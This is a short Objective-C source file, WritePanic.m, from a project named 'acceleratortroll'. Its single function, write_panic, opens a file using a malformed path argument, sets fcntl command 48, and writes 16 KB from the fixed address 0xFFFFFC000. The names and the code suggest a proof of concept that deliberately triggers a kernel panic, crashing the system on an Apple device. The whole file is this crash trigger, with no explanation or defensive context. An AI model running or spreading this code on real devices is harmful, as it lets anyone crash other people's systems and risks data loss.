//
//  WritePanic.m
//  acceleratortroll
//
//  Created by Jan Garcia on 15/5/23.
//

#import <fcntl.h>
#import <unistd.h>
#import "acceleratortroll-Bridging-Header.h"

int write_panic(void) {
  int i = 1;
  int f = open(&i, 513);
  printf("f -> %x\n", f);
  fcntl(f, 48, 1);
  write(f, (const void *)0xFFFFFC000, 1 << 14);
  close(f);
  printf("got here\n");
  return f;
}
